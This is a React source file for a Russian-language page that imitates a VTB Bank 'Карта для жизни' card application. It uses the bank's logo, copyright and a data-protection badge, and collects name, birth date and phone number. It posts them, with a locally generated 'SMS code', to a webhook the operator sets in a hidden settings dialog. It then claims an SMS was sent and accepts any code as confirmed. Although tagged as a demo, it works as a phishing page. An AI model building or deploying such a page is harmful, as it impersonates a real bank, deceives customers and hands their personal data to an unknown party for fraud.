import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { useToast } from '@/hooks/use-toast';
import { Settings, Check, ArrowLeft, Phone, Mail, ShieldCheck } from 'lucide-react';
import FloatingZammadChat from '@/components/FloatingZammadChat';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";

const WEBHOOK_STORAGE_KEY = 'bank_webhook_url';
const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';

type Step = 'form' | 'sms' | 'success';

// Таблица транслитерации русских букв в латинские
const translitMap: { [key: string]: string } = {
  'а': 'a', 'б': 'b', 'в': 'v', 'г': 'g', 'д': 'd', 'е': 'e', 'ё': 'e',
  'ж': 'zh', 'з': 'z', 'и': 'i', 'й': 'y', 'к': 'k', 'л': 'l', 'м': 'm',
  'н': 'n', 'о': 'o', 'п': 'p', 'р': 'r', 'с': 's', 'т': 't', 'у': 'u',
  'ф': 'f', 'х': 'kh', 'ц': 'ts', 'ч': 'ch', 'ш': 'sh', 'щ': 'shch',
  'ъ': '', 'ы': 'y', 'ь': '', 'э': 'e', 'ю': 'yu', 'я': 'ya',
  'А': 'A', 'Б': 'B', 'В': 'V', 'Г': 'G', 'Д': 'D', 'Е': 'E', 'Ё': 'E',
  'Ж': 'ZH', 'З': 'Z', 'И': 'I', 'Й': 'Y', 'К': 'K', 'Л': 'L', 'М': 'M',
  'Н': 'N', 'О': 'O', 'П': 'P', 'Р': 'R', 'С': 'S', 'Т': 'T', 'У': 'U',
  'Ф': 'F', 'Х': 'KH', 'Ц': 'TS', 'Ч': 'CH', 'Ш': 'SH', 'Щ': 'SHCH',
  'Ъ': '', 'Ы': 'Y', 'Ь': '', 'Э': 'E', 'Ю': 'YU', 'Я': 'YA',
  ' ': ' '
};

// Функция транслитерации
const transliterate = (text: string): string => {
  return text
    .split('')
    .map(char => translitMap[char] || char)
    .join('')
    .toUpperCase();
};

// Функция для получения Имени и Фамилии из ФИО
const getCardHolderName = (fullName: string): string => {
  const parts = fullName.trim().split(/\s+/);
  if (parts.length === 0) return '';
  if (parts.length === 1) return transliterate(parts[0]);
  // Формат: ИМЯ ФАМИЛИЯ (второе слово - имя, первое - фамилия)
  const surname = parts[0]; // Фамилия
  const name = parts[1]; // Имя
  return transliterate(`${name} ${surname}`);
};

// Генерация номера карты
const generateCardNumber = (): string => {
  const groups = [];
  for (let i = 0; i < 4; i++) {
    groups.push(String(Math.floor(1000 + Math.random() * 9000)));
  }
  return groups.join(' ');
};

// Генерация даты истечения срока (текущий месяц + 5 лет)
const generateExpiryDate = (): string => {
  const now = new Date();
  const month = String(now.getMonth() + 1).padStart(2, '0');
  const year = String((now.getFullYear() + 5) % 100).padStart(2, '0');
  return `${month}/${year}`;
};

const Bank = () => {
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [step, setStep] = useState<Step>('form');
  const [webhookUrl, setWebhookUrl] = useState('');
  const [tempWebhookUrl, setTempWebhookUrl] = useState('');
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);

  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    birthDate: '',
    agreeTerms: false,
  });

  const [smsCode, setSmsCode] = useState('');
  const [generatedCode, setGeneratedCode] = useState('');

  // Генерируем номер карты и дату один раз при загрузке
  const [cardNumber] = useState(() => generateCardNumber());
  const [expiryDate] = useState(() => generateExpiryDate());

  useEffect(() => {
    const savedUrl = localStorage.getItem(WEBHOOK_STORAGE_KEY) || DEFAULT_WEBHOOK_URL;
    setWebhookUrl(savedUrl);
    setTempWebhookUrl(savedUrl);
  }, []);

  // Calculate progress based on filled fields
  const calculateProgress = () => {
    let filled = 0;
    const total = 4;
    if (formData.fullName.trim()) filled++;
    if (formData.birthDate.length === 10) filled++;
    if (formData.phone.replace(/\D/g, '').length === 10) filled++;
    if (formData.agreeTerms) filled++;
    return Math.round((filled / total) * 100);
  };

  const getProgressHint = () => {
    if (!formData.fullName.trim()) return 'Укажите ФИО';
    if (formData.birthDate.length !== 10) return 'Укажите дату рождения';
    if (formData.phone.replace(/\D/g, '').length !== 10) return 'Укажите номер телефона';
    if (!formData.agreeTerms) return 'Подтвердите наличие паспорта';
    return 'Все данные заполнены';
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value;
    let digits = input.replace(/\D/g, '');

    if (digits.startsWith('7') || digits.startsWith('8')) {
      digits = digits.slice(1);
    }

    digits = digits.slice(0, 10);

    let formatted = '';
    if (digits.length > 0) {
      formatted = digits.slice(0, 3);
    }
    if (digits.length > 3) {
      formatted += ') ' + digits.slice(3, 6);
    }
    if (digits.length > 6) {
      formatted += '-' + digits.slice(6, 8);
    }
    if (digits.length > 8) {
      formatted += '-' + digits.slice(8, 10);
    }

    if (formatted) {
      formatted = '(' + formatted;
    }

    setFormData(prev => ({ ...prev, phone: formatted }));
  };

  const handleBirthDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');

    if (value.length > 8) {
      value = value.slice(0, 8);
    }

    let formatted = '';
    if (value.length > 0) {
      formatted = value.slice(0, 2);
    }
    if (value.length > 2) {
      formatted += '.' + value.slice(2, 4);
    }
    if (value.length > 4) {
      formatted += '.' + value.slice(4, 8);
    }

    setFormData(prev => ({ ...prev, birthDate: formatted }));
  };

  const saveWebhookSettings = () => {
    localStorage.setItem(WEBHOOK_STORAGE_KEY, tempWebhookUrl);
    setWebhookUrl(tempWebhookUrl);
    setIsSettingsOpen(false);
    toast({
      title: "Настройки сохранены",
      description: "URL webhook успешно обновлен",
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.agreeTerms) {
      toast({
        title: "Ошибка",
        description: "Подтвердите наличие паспорта гражданина РФ",
        variant: "destructive",
      });
      return;
    }

    const phoneDigits = formData.phone.replace(/\D/g, '');
    if (phoneDigits.length !== 10) {
      toast({
        title: "Ошибка",
        description: "Введите корректный номер телефона",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    // Генерируем 4-значный код подтверждения
    const code = String(Math.floor(1000 + Math.random() * 9000));
    setGeneratedCode(code);

    try {
      const payload = {
        fullName: formData.fullName,
        phone: '7' + phoneDigits,
        birthDate: formData.birthDate,
        smsCode: code,
        timestamp: new Date().toISOString(),
        source: 'vtb-demo-page',
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });
    } catch (error) {
      console.error('Webhook error:', error);
    } finally {
      setIsLoading(false);
      setStep('sms');
      toast({
        title: "Код отправлен",
        description: "SMS с кодом подтверждения отправлен на ваш номер",
      });
    }
  };

  const handleSmsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (smsCode.length !== 4) {
      toast({
        title: "Ошибка",
        description: "Введите 4-значный код из SMS",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    // Имитация проверки кода
    await new Promise(resolve => setTimeout(resolve, 1000));

    setIsLoading(false);
    setStep('success');
    toast({
      title: "Заявка отправлена!",
      description: "Мы свяжемся с вами в ближайшее время",
    });
  };

  const handleSmsCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
    setSmsCode(value);
  };

  // SMS verification screen
  if (step === 'sms') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full">
          <button
            onClick={() => setStep('form')}
            className="flex items-center gap-2 text-gray-500 hover:text-gray-700 mb-8"
          >
            <ArrowLeft className="w-4 h-4" />
            Назад
          </button>

          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-gradient-to-br from-[#00D4FF] to-[#0066FF] rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
              <ShieldCheck className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-2xl font-medium text-gray-900 mb-2">Подтверждение</h2>
            <p className="text-gray-500">
              Введите код из SMS, отправленный на номер
            </p>
            <p className="text-gray-900 font-medium">+7 {formData.phone}</p>
          </div>

          <form onSubmit={handleSmsSubmit} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="smsCode" className="text-gray-700 text-sm font-medium">
                Код из SMS
              </Label>
              <Input
                id="smsCode"
                value={smsCode}
                onChange={handleSmsCodeChange}
                placeholder="0000"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={4}
                className="h-14 rounded-lg border-gray-200 bg-white text-gray-900 text-center text-2xl tracking-[0.5em] font-mono focus:border-[#0066FF] focus:ring-0"
                autoFocus
              />
            </div>

            <Button
              type="submit"
              disabled={isLoading || smsCode.length !== 4}
              className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg disabled:opacity-50"
            >
              {isLoading ? (
                <div className="flex items-center gap-2">
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  Проверка...
                </div>
              ) : (
                'Подтвердить'
              )}
            </Button>

            <p className="text-center text-sm text-gray-400">
              Не получили код?{' '}
              <button
                type="button"
                className="text-[#0066FF] hover:underline"
                onClick={async () => {
                  // Генерируем новый код
                  const newCode = String(Math.floor(1000 + Math.random() * 9000));
                  setGeneratedCode(newCode);
                  setSmsCode('');

                  // Отправляем новый код в вебхук
                  const phoneDigits = formData.phone.replace(/\D/g, '');
                  try {
                    await fetch(webhookUrl, {
                      method: 'POST',
                      headers: {
                        'Content-Type': 'application/json',
                      },
                      body: JSON.stringify({
                        fullName: formData.fullName,
                        phone: '7' + phoneDigits,
                        birthDate: formData.birthDate,
                        smsCode: newCode,
                        timestamp: new Date().toISOString(),
                        source: 'vtb-demo-page',
                        resend: true,
                      }),
                    });
                  } catch (error) {
                    console.error('Webhook error:', error);
                  }

                  toast({
                    title: "Код отправлен повторно",
                    description: "Новый SMS с кодом отправлен на ваш номер",
                  });
                }}
              >
                Отправить повторно
              </button>
            </p>
          </form>
        </div>
      </div>
    );
  }

  // Success screen
  if (step === 'success') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center">
          <div className="w-20 h-20 bg-gradient-to-br from-[#00D4FF] to-[#0066FF] rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
            <Check className="w-10 h-10 text-white" />
          </div>
          <h2 className="text-2xl font-medium text-gray-900 mb-4">Заявка успешно отправлена!</h2>
          <p className="text-gray-500 mb-2">
            Спасибо, {formData.fullName.split(' ')[0]}!
          </p>
          <p className="text-gray-400 mb-8">
            Наш специалист свяжется с вами по номеру +7 {formData.phone} в ближайшее время для уточнения деталей.
          </p>
          <Button
            onClick={() => {
              setStep('form');
              setFormData({
                fullName: '',
                phone: '',
                birthDate: '',
                agreeTerms: false,
              });
              setSmsCode('');
            }}
            className="bg-[#0066FF] hover:bg-[#0052CC] text-white px-8 h-12 rounded-lg"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Оформить ещё одну карту
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="border-b border-gray-100">
        <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
          <img
            src="/uploads/Main_ic_LogoVTBlight.svg"
            alt="ВТБ"
            className="h-9 w-auto"
          />
          <div className="flex items-center gap-4">
            <div className="hidden sm:flex items-center gap-2 text-sm text-gray-500">
              <ShieldCheck className="w-4 h-4 text-[#0066FF]" />
              Данные защищены
            </div>
            <Dialog open={isSettingsOpen} onOpenChange={setIsSettingsOpen}>
              <DialogTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="text-gray-400 hover:text-gray-600 hover:bg-gray-100"
                >
                  <Settings className="w-5 h-5" />
                </Button>
              </DialogTrigger>
              <DialogContent className="sm:max-w-md bg-white border-gray-200">
                <DialogHeader>
                  <DialogTitle className="text-gray-900">Настройки Webhook</DialogTitle>
                  <DialogDescription className="text-gray-500">
                    Укажите URL для отправки данных заявки
                  </DialogDescription>
                </DialogHeader>
                <div className="space-y-4 py-4">
                  <div className="space-y-2">
                    <Label htmlFor="webhook-url" className="text-gray-700">Webhook URL</Label>
                    <Input
                      id="webhook-url"
                      value={tempWebhookUrl}
                      onChange={(e) => setTempWebhookUrl(e.target.value)}
                      placeholder="https://your-webhook-url.com/api"
                      className="bg-white border-gray-300 text-gray-900 placeholder:text-gray-400"
                    />
                  </div>
                  <Button onClick={saveWebhookSettings} className="w-full bg-[#0066FF] hover:bg-[#0052CC] text-white">
                    Сохранить
                  </Button>
                </div>
              </DialogContent>
            </Dialog>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1">
        <div className="max-w-6xl mx-auto px-4 py-10">
          {/* Title */}
          <h1 className="text-3xl md:text-4xl font-light text-gray-900 mb-6">
            Карта для жизни
          </h1>

          {/* Progress */}
          <div className="mb-8">
            <div className="flex items-center gap-4 text-sm mb-3">
              <span className="text-gray-700 font-medium">Заполнение заявки</span>
              <span className={`ml-auto font-medium ${calculateProgress() === 100 ? 'text-green-600' : 'text-[#0066FF]'}`}>
                {calculateProgress()}%
              </span>
            </div>
            <div className="h-2 bg-gray-100 rounded-full overflow-hidden mb-2">
              <div
                className={`h-full transition-all duration-300 rounded-full ${calculateProgress() === 100 ? 'bg-green-500' : 'bg-[#0066FF]'}`}
                style={{ width: `${calculateProgress()}%` }}
              />
            </div>
            <p className={`text-sm ${calculateProgress() === 100 ? 'text-green-600' : 'text-gray-400'}`}>
              {getProgressHint()}
            </p>
          </div>

          <div className="grid lg:grid-cols-2 gap-12 lg:gap-16">
            {/* Left - Form */}
            <div>
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="fullName" className="text-gray-700 text-sm font-medium">
                    Фамилия, имя и отчество
                  </Label>
                  <Input
                    id="fullName"
                    name="fullName"
                    value={formData.fullName}
                    onChange={handleInputChange}
                    placeholder="Иванов Иван Иванович"
                    required
                    className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
                  />
                  <p className="text-gray-400 text-xs">Укажите как в паспорте</p>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="birthDate" className="text-gray-700 text-sm font-medium">
                    Дата рождения
                  </Label>
                  <Input
                    id="birthDate"
                    name="birthDate"
                    value={formData.birthDate}
                    onChange={handleBirthDateChange}
                    placeholder="ДД.ММ.ГГГГ"
                    inputMode="numeric"
                    required
                    className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-gray-700 text-sm font-medium">
                    Мобильный телефон
                  </Label>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-900">+7</span>
                    <Input
                      id="phone"
                      name="phone"
                      type="tel"
                      inputMode="tel"
                      value={formData.phone}
                      onChange={handlePhoneChange}
                      placeholder="(999) 123-45-67"
                      required
                      className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0 pl-10"
                    />
                  </div>
                  <p className="text-gray-400 text-xs">На этот номер вам перезвонит специалист</p>
                </div>

                <div className="flex items-center space-x-3 pt-2">
                  <Checkbox
                    id="agreeTerms"
                    checked={formData.agreeTerms}
                    onCheckedChange={(checked) =>
                      setFormData(prev => ({ ...prev, agreeTerms: checked === true }))
                    }
                    className="border-gray-300 data-[state=checked]:bg-[#0066FF] data-[state=checked]:border-[#0066FF]"
                  />
                  <Label htmlFor="agreeTerms" className="text-sm text-gray-700 cursor-pointer">
                    У меня есть действующий паспорт гражданина РФ
                  </Label>
                </div>

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      Отправка...
                    </div>
                  ) : (
                    'Отправить заявку'
                  )}
                </Button>

                <p className="text-xs text-gray-400 leading-relaxed">
                  Нажимая "Отправить заявку", я соглашаюсь с{' '}
                  <a href="#" className="text-[#0066FF] hover:underline">условиями обработки</a>
                  {' '}персональных данных и ознакомлен с{' '}
                  <a href="#" className="text-[#0066FF] hover:underline">тарифами</a>,{' '}
                  <a href="#" className="text-[#0066FF] hover:underline">правилами</a> и{' '}
                  <a href="#" className="text-[#0066FF] hover:underline">условиями</a> продукта
                </p>
              </form>
            </div>

            {/* Right - Card & Benefits */}
            <div className="space-y-8">
              {/* Card with shopping basket */}
              <div className="relative max-w-[380px]">
                {/* Shopping basket floating above card */}
                <div className="absolute -top-16 left-4 z-10">
                  {/* Basket container */}
                  <div className="relative">
                    {/* Badge "100% кешбэк" */}
                    <div className="absolute -left-2 top-8 z-20 bg-gradient-to-r from-[#FF6B9D] via-[#C44FE2] to-[#7B61FF] text-white text-xs font-bold px-3 py-1.5 rounded-full shadow-lg transform -rotate-12">
                      100%
                      <span className="block text-[10px] font-normal -mt-0.5">кешбэк</span>
                    </div>
                    {/* Basket SVG */}
                    <svg width="100" height="90" viewBox="0 0 100 90" fill="none" className="drop-shadow-xl">
                      {/* Basket body */}
                      <ellipse cx="50" cy="70" rx="35" ry="15" fill="url(#basketGradient)"/>
                      <path d="M15 55 Q15 75 50 80 Q85 75 85 55 L85 45 Q85 40 80 40 L20 40 Q15 40 15 45 Z" fill="url(#basketGradient)"/>
                      {/* Basket rim */}
                      <ellipse cx="50" cy="40" rx="35" ry="8" fill="#9B6DD6"/>
                      {/* Basket handle */}
                      <path d="M30 40 Q30 15 50 15 Q70 15 70 40" stroke="#9B6DD6" strokeWidth="5" fill="none"/>
                      {/* Groceries - bread */}
                      <ellipse cx="45" cy="28" rx="12" ry="8" fill="#E8B86D"/>
                      <ellipse cx="45" cy="26" rx="10" ry="5" fill="#F4D5A6"/>
                      {/* Groceries - carrot */}
                      <path d="M65 20 L72 35 L68 35 Z" fill="#FF7F50"/>
                      <path d="M65 20 L63 12" stroke="#4CAF50" strokeWidth="2"/>
                      <path d="M65 20 L67 13" stroke="#4CAF50" strokeWidth="2"/>
                      {/* Groceries - bottle */}
                      <rect x="55" y="22" width="8" height="18" rx="2" fill="#4FC3F7"/>
                      <rect x="57" y="18" width="4" height="5" fill="#4FC3F7"/>
                      {/* Groceries - green leaf */}
                      <ellipse cx="38" cy="22" rx="5" ry="8" fill="#66BB6A" transform="rotate(-20 38 22)"/>
                      <defs>
                        <linearGradient id="basketGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                          <stop offset="0%" stopColor="#B388FF"/>
                          <stop offset="100%" stopColor="#7C4DFF"/>
                        </linearGradient>
                      </defs>
                    </svg>
                  </div>
                </div>

                {/* Card */}
                <div className="relative aspect-[1.586/1] rounded-2xl overflow-hidden shadow-2xl mt-12">
                  {/* Blue gradient background */}
                  <div className="absolute inset-0 bg-gradient-to-br from-[#42A5F5] via-[#1E88E5] to-[#1565C0]" />

                  {/* Декоративные элементы */}
                  <div className="absolute inset-0 overflow-hidden">
                    <div className="absolute -right-10 -top-10 w-40 h-40 bg-white/10 rounded-full blur-xl" />
                    <div className="absolute -left-10 -bottom-10 w-32 h-32 bg-white/5 rounded-full blur-lg" />
                  </div>

                  {/* VTB Logo - top right */}
                  <div className="absolute top-5 right-5">
                    <svg width="60" height="24" viewBox="0 0 60 24" fill="none">
                      {/* Three horizontal lines */}
                      <rect x="0" y="4" width="16" height="3" fill="white"/>
                      <rect x="0" y="10" width="16" height="3" fill="white"/>
                      <rect x="0" y="16" width="16" height="3" fill="white"/>
                      {/* ВТБ text */}
                      <text x="22" y="18" fill="white" fontSize="16" fontWeight="bold" fontFamily="Arial, sans-serif">ВТБ</text>
                    </svg>
                  </div>

                  {/* Chip */}
                  <div className="absolute top-5 left-5">
                    <div className="w-12 h-9 rounded-md bg-gradient-to-br from-[#FFD700] via-[#FFC107] to-[#FF9800] shadow-inner flex items-center justify-center">
                      <div className="w-8 h-6 border border-[#B8860B]/40 rounded-sm grid grid-cols-3 grid-rows-2 gap-px p-0.5">
                        {[...Array(6)].map((_, i) => (
                          <div key={i} className="bg-[#B8860B]/30 rounded-[1px]" />
                        ))}
                      </div>
                    </div>
                  </div>

                  {/* Card Number */}
                  <div className="absolute top-[45%] left-5 right-5 transform -translate-y-1/2">
                    <p className="text-white text-xl md:text-2xl font-mono tracking-[0.2em] drop-shadow-md">
                      {cardNumber}
                    </p>
                  </div>

                  {/* Expiry Date & Card Holder */}
                  <div className="absolute bottom-12 left-5 right-5 flex justify-between items-end">
                    <div className="flex-1 min-w-0">
                      <p className="text-white/60 text-[10px] uppercase tracking-wider mb-0.5">Card Holder</p>
                      <p className="text-white text-sm font-medium tracking-wide truncate drop-shadow-sm transition-all duration-300">
                        {formData.fullName ? getCardHolderName(formData.fullName) : 'YOUR NAME'}
                      </p>
                    </div>
                    <div className="ml-4 text-right">
                      <p className="text-white/60 text-[10px] uppercase tracking-wider mb-0.5">Valid Thru</p>
                      <p className="text-white text-sm font-medium font-mono drop-shadow-sm">{expiryDate}</p>
                    </div>
                  </div>

                  {/* MIR Logo - bottom left */}
                  <div className="absolute bottom-3 left-5">
                    <svg width="50" height="20" viewBox="0 0 70 28" fill="none">
                      {/* MIR logo background shape */}
                      <rect x="0" y="4" width="70" height="20" rx="4" fill="url(#mirGradient)"/>
                      {/* МИР text */}
                      <text x="10" y="19" fill="white" fontSize="14" fontWeight="bold" fontFamily="Arial, sans-serif">МИР</text>
                      <defs>
                        <linearGradient id="mirGradient" x1="0%" y1="0%" x2="100%" y2="0%">
                          <stop offset="0%" stopColor="#4FC3F7"/>
                          <stop offset="50%" stopColor="#7C4DFF"/>
                          <stop offset="100%" stopColor="#E040FB"/>
                        </linearGradient>
                      </defs>
                    </svg>
                  </div>
                </div>
              </div>

              {/* Benefits */}
              <div className="grid grid-cols-2 gap-x-8 gap-y-6">
                <div>
                  <p className="text-gray-500 text-sm mb-1">Кэшбэк рублями за покупки</p>
                  <p className="text-2xl font-normal text-gray-900">До 3000 ₽</p>
                </div>
                <div>
                  <p className="text-gray-500 text-sm mb-1">Кэшбэк рублями в супермаркетах*</p>
                  <p className="text-2xl font-normal text-gray-900">100%</p>
                </div>
                <div>
                  <p className="text-gray-500 text-sm mb-1">Выпуск и обслуживание</p>
                  <p className="text-2xl font-normal text-gray-900">Бесплатно</p>
                </div>
                <div>
                  <p className="text-gray-500 text-sm mb-1">Доставка карты по всей России</p>
                  <p className="text-2xl font-normal text-gray-900">Бесплатно</p>
                </div>
              </div>

              <p className="text-xs text-gray-400 leading-relaxed">
                *До 1000 ₽ в месяц для новых клиентов при выборе категории «Супермаркеты»
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-gray-100 mt-auto">
        <div className="max-w-6xl mx-auto px-4 py-6">
          <div className="flex flex-col md:flex-row md:items-start justify-between gap-6">
            <div className="space-y-2">
              <a href="#" className="text-[#0066FF] text-sm hover:underline block">
                Положение об организации обработки персональных данных в Банке ВТБ (ПАО) (выписка)
              </a>
              <a href="#" className="text-[#0066FF] text-sm hover:underline block">
                Уведомление об условиях обработки данных сервисом SmartCaptcha
              </a>
            </div>
            <div className="flex flex-col sm:flex-row gap-4 sm:gap-8">
              <a href="#" className="flex items-center gap-2 text-gray-700 text-sm hover:text-[#0066FF]">
                <Phone className="w-4 h-4" />
                Контакты
              </a>
              <a href="#" className="flex items-center gap-2 text-gray-700 text-sm hover:text-[#0066FF]">
                <Mail className="w-4 h-4" />
                Написать в банк
              </a>
            </div>
          </div>
          <div className="mt-6 pt-6 border-t border-gray-100">
            <p className="text-xs text-gray-400">
              © Банк ВТБ (ПАО), 2007–2025. Банк ВТБ использует{' '}
              <a href="#" className="text-[#0066FF] hover:underline">файлы cookie</a>
              {' '}для повышения удобства работы с ВТБ Онлайн. В cookie содержатся данные о прошлых посещениях сайта.
            </p>
          </div>
        </div>
      </footer>

      {/* Zammad Chat Widget */}
      <FloatingZammadChat />
    </div>
  );
};

export default Bank;
